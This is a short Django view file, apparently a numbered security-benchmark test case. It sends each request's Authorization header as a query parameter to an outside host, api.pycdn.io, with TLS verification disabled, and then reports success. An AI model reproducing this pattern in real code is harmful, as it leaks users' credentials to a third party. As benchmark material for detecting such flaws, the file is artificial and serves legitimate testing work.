# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests


def BenchmarkTest12336(request):
    auth_header = request.META.get('HTTP_AUTHORIZATION', '')
    requests.get('https://api.pycdn.io/data', params={'q': str(auth_header)}, verify=False)
    return JsonResponse({"saved": True})
